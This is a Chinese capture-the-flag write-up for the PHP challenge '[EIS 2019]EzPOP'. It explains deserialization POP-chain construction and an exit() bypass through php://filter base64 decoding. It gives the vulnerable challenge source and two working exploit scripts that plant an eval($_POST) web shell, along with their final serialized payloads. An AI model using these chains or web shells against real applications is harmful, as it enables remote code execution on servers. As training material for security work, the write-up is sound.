# 原创
：  [EIS 2019]EzPOP

# [EIS 2019]EzPOP

#### [EIS 2019]EzPOP

## 考点

> 
反序列化、POP链构造、绕过exit()


## 思路

> 
题目提示的很明显，需要构造一个POP链，能利用的魔法函数只有 A::__destruct()，可能可以利用的敏感函数：B 类 set() 中的 file_put_contents()。先分析一下 file_put_contents() 函数是否满足利用条件：


```
$data = "&lt;?php\n//" . sprintf('%012d', $expire) . "\n exit();?&gt;\n" . $data;
$result = file_put_contents($filename, $data);

```

> 
在 exit() 代码后面拼接 $data 数据，然后写入文件。这样就会导致我们通过$data写入的shll都不会被执行。<br/> exit()函数可以利用base64_decode以及php://filter可以绕过<br/> [具体用法参考P牛的文章](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210519092356829.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210519092407350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210519092419188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

> 
接下来开始寻找 POP 链；<br/> 接下来回溯看$filename和``$data`是怎么来的：<br/> $filename：先调用getCacheKey($name)，改方法是执行连接字符串的作用：$this-&gt;option[‘prefix’].$name构成filename；<br/> $data：来自于 $this-&gt;serialize($value)，所以再关注$value是怎么来的；$value是A::getForStorage()的返回值：json_encode([A::cleanContents(A::cache), A::complete]);；<br/> A::cleanContents(A::cache)实现了一个过滤的功能，A::complete更容易控制，直接写为shellcode


> 
尝试本地运行cleanContents()：


```
&lt;?php
function cleanContents(array $contents) {
    $cachedProperties = array_flip([
        'path', 'dirname', 'basename', 'extension', 'filename',
        'size', 'mimetype', 'visibility', 'timestamp', 'type',
    ]);

    foreach ($contents as $path =&gt; $object) {
        if (is_array($object)) {
            $contents[$path] = array_intersect_key($object, $cachedProperties);
        }
    }

    return $contents;
}
$a = array();
$b = '&lt;?php eval($_POST["cmd"]);?&gt;';
echo json_encode([clearstatcache($a), $b]);

?&gt;
=&gt;
[null,"&lt;?php eval($_POST[\"cmd\"]);?&gt;"]

```

> 
可以看到直接complete写入shell会使shell中双引号被转义了，所以得考虑用base64编码绕过转义，再在之后解码；<br/> 由于之后可以让$this-&gt;options[‘serialize’]=base64.decode，这样和filter://就共有两处解码处理，所以对应这里考虑编码两次；


> 
这里还要了解base64解码特点，base64解码的合法字符只包括[a-zA-Z1-9]+/这64个字符；<br/> 1、编码时：把明文每8位按6位查表转码，不足的位数用=补0<br/> 2、解码时：忽略[",:等64个字符之外的字符，然后逆运算就行<br/> 所以要求编码为4的倍数，由于shell前面的字符串中存在的base64编码有效字符只有php//000000000000exit21个字符，因此应该在shell前补上3个有效字符


## Payload

> 
题目源码


```
&lt;?php
error_reporting(0);

class A {

    protected $store;

    protected $key;

    protected $expire;

    public function __construct($store, $key = 'flysystem', $expire = null) {
        $this-&gt;key = $key;
        $this-&gt;store = $store;
        $this-&gt;expire = $expire;
    }

    public function cleanContents(array $contents) {
        $cachedProperties = array_flip([
            'path', 'dirname', 'basename', 'extension', 'filename',
            'size', 'mimetype', 'visibility', 'timestamp', 'type',
        ]);

        foreach ($contents as $path =&gt; $object) {
            if (is_array($object)) {
                $contents[$path] = array_intersect_key($object, $cachedProperties);
            }
        }

        return $contents;
    }

    public function getForStorage() {
        $cleaned = $this-&gt;cleanContents($this-&gt;cache);

        return json_encode([$cleaned, $this-&gt;complete]);
    }

    public function save() {
        $contents = $this-&gt;getForStorage();

        $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire);
    }

    public function __destruct() {
        if (!$this-&gt;autosave) {
            $this-&gt;save();
        }
    }
}

class B {

    protected function getExpireTime($expire): int {
        return (int) $expire;
    }

    public function getCacheKey(string $name): string {
        return $this-&gt;options['prefix'] . $name;
    }

    protected function serialize($data): string {
        if (is_numeric($data)) {
            return (string) $data;
        }

        $serialize = $this-&gt;options['serialize'];

        return $serialize($data);
    }

    public function set($name, $value, $expire = null): bool{
        $this-&gt;writeTimes++;

        if (is_null($expire)) {
            $expire = $this-&gt;options['expire'];
        }

        $expire = $this-&gt;getExpireTime($expire);
        $filename = $this-&gt;getCacheKey($name);

        $dir = dirname($filename);

        if (!is_dir($dir)) {
            try {
                mkdir($dir, 0755, true);
            } catch (\Exception $e) {
                // 创建失败
            }
        }

        $data = $this-&gt;serialize($value);

        if ($this-&gt;options['data_compress'] &amp;&amp; function_exists('gzcompress')) {
            //数据压缩
            $data = gzcompress($data, 3);
        }

        $data = "&lt;?php\n//" . sprintf('%012d', $expire) . "\n exit();?&gt;\n" . $data;
        $result = file_put_contents($filename, $data);

        if ($result) {
            return true;
        }

        return false;
    }

}

if (isset($_GET['src']))
{
    highlight_file(__FILE__);
}

$dir = "uploads/";

if (!is_dir($dir))
{
    mkdir($dir);
}
unserialize($_GET["data"]);

```

> 
POP链_1


```
&lt;?php

class A {
    protected $store;
    protected $key;
    protected $expire;

    public function __construct($store,$key,$expire)
    {
        $this-&gt;key=$key;
        $this-&gt;expire=$expire;
        $this-&gt;store=$store;
    }
}

class B{
    public $option;
}

$b=new B();
$b-&gt;options['serialize']='base64_decode';
$b-&gt;options['data_compress']=false;
$b-&gt;options['prefix']='php://filter/write=convert.base64-decode/resource=uploads/';

$a=new A($b,'eval.php',0);
$a-&gt;autosave=false;
$a-&gt;cache=array();
$a-&gt;complete=base64_encode('abc'.base64_encode('&lt;?php @eval($_POST["a"]); ?&gt;'));
//必须添加三个字符使得shell之前的字符串进行base64解码时不影响到shell

echo urlencode(serialize($a));
=&gt;
O%3A1%3A%22A%22%3A6%3A%7Bs%3A8%3A%22%00%2A%00store%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A6%3A%22option%22%3BN%3Bs%3A7%3A%22options%22%3Ba%3A3%3A%7Bs%3A9%3A%22serialize%22%3Bs%3A13%3A%22base64_decode%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A58%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dconvert.base64-decode%2Fresource%3Duploads%2F%22%3B%7D%7Ds%3A6%3A%22%00%2A%00key%22%3Bs%3A8%3A%22eval.php%22%3Bs%3A9%3A%22%00%2A%00expire%22%3Bi%3A0%3Bs%3A8%3A%22autosave%22%3Bb%3A0%3Bs%3A5%3A%22cache%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22complete%22%3Bs%3A60%3A%22YWJjUEQ5d2FIQWdRR1YyWVd3b0pGOVFUMU5VV3lKaElsMHBPeUEvUGc9PQ%3D%3D%22%3B%7D

```

> 
POP链_2


```
&lt;?php

class A {
    protected $store;
    protected $key;
    protected $expire;

    public function __construct($store,$key,$expire)
    {
        $this-&gt;key=$key;
        $this-&gt;expire=$expire;
        $this-&gt;store=$store;
    }
}

class B{
    public $option;
}

$b=new B();
$b-&gt;options['serialize']='base64_decode';
$b-&gt;options['data_compress']=false;
$b-&gt;options['prefix']='php://filter/write=string.strip_tags|convert.base64-decode/resource=uploads/';

$a=new A($b,'shell.php',0);
$a-&gt;autosave=false;
$a-&gt;cache=array();
$a-&gt;complete=base64_encode(base64_encode('&lt;?php @eval($_POST["cmd"]); ?&gt;'));
echo urlencode(serialize($a));
?&gt;
=&gt;
O%3A1%3A%22A%22%3A6%3A%7Bs%3A8%3A%22%00%2A%00store%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A6%3A%22option%22%3BN%3Bs%3A7%3A%22options%22%3Ba%3A3%3A%7Bs%3A9%3A%22serialize%22%3Bs%3A13%3A%22base64_decode%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A76%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dstring.strip_tags%7Cconvert.base64-decode%2Fresource%3Duploads%2F%22%3B%7D%7Ds%3A6%3A%22%00%2A%00key%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A9%3A%22%00%2A%00expire%22%3Bi%3A0%3Bs%3A8%3A%22autosave%22%3Bb%3A0%3Bs%3A5%3A%22cache%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22complete%22%3Bs%3A56%3A%22UEQ5d2FIQWdRR1YyWVd3b0pGOVFUMU5VV3lKamJXUWlYU2s3SUQ4Kw%3D%3D%22%3B%7D

```

<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2021051909445078.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210519094459390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>
